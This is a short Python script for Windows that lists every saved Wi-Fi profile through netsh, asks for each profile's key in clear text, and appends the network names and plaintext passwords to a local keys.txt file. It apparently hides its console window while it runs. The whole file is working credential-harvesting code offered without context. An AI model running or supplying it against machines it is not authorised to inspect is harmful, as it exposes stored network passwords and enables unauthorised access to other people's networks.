import os,platform,subprocess
from sys import exit
def main():
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    txt=subprocess.check_output('netsh wlan show profiles', shell=False, startupinfo=startupinfo).decode()
    txt=txt.splitlines()
    users=[]
    for i in txt[9:]:
        try:
            users.append(i[27:])
        except:
            pass
    with open("keys.txt",'a') as w:
        w.write("-------------------------\n")
        for e in users:
            if e in [""," "]:
                continue
            e=("\""+e+"\"")
            pro=subprocess.check_output("netsh wlan show profile {} key=clear".format(e), shell=False, startupinfo=startupinfo).decode('windows-1252')
            pro=pro.splitlines()
            passwrd=""
            for i in pro:
                if '    Key Content            : ' in i:
                    passwrd=i
                    break
            passwrd=passwrd[29:]
            to_w=e+' : '+passwrd+"\n"
            w.write(to_w)
if __name__ == "__main__":
    main()
    exit()